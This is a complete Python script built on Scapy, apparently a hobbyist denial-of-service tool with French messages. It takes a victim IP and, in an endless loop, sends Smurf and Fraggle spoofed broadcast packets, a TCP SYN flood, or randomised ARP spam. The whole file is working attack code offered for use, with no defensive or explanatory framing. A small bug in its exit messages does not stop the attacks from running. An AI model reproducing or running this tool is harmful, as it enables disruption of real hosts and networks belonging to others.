#!/usr/bin/env python
#-*-coding:UTF-8-*-

from scapy.all import *
import os,sys,threading,signal,argparse


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
    parser.add_argument("-s", "--sourceIP", help="Choose the broadcast IP address. Example: -r 192.168.0.255")
    parser.add_argument("-t","--attackType",help="Choose the attack type, Smurf or Fraggle")
    parser.add_argument("-dp","--dport",help="Choose the destination port. Example: -dp 80")
    return parser.parse_args()

def dos(ipSrc, ipDst, attackType):
    if attackType == "Smurf" or attackType == "smurf":
        send(IP(src=ipSrc,dst=ipDst)/ICMP(),verbose=0)
    elif attackType == "Fraggle" or attackType== "fraggle":
        send(IP(src=ipSrc, dst=ipDst)/UDP(dport=7),verbose=0)

def flood(ipVictim,victimPort):
    port=int(victimPort)
    send(IP(dst=ipVictim,id=RandShort(),ttl=random.randint(10,99))/TCP(sport=RandShort(),dport=port,seq=12345,ack=1000,window=1000,flags='S')/"Attaque SYNC Flood",verbose=0)

def hwFlood(victimIP):
    srcHw=RandMAC()
    dstHw=RandMAC()
    sendp(Ether(src=srcHw,dst=dstHw)/ARP(op=1,psrc=victimIP,hwsrc=srcHw,hwdst=dstHw)/Padding(load="X"*18),verbose=0)

args=parse_args()
victimIP=args.victimIP
sourceIP=args.sourceIP
attackType=args.attackType
victimPort=args.dport
while 1:
    if attackType=="flood":
        try:
            flood(victimIP, victimPort)
        except KeyboardInterrupt:
            sys.exit("Fin du DoS sur %s")%(victimIP)
    elif attackType=="hw":
        try:
            hwFlood(victimIP)
        except KeyboardInterrupt:
            sys.exit("Fin du HW spam sur %s")%(victimIP)
    else:
        try:
            dos(victimIP,sourceIP,attackType)
        except KeyboardInterrupt:
            sys.exit("Fin du DoS")
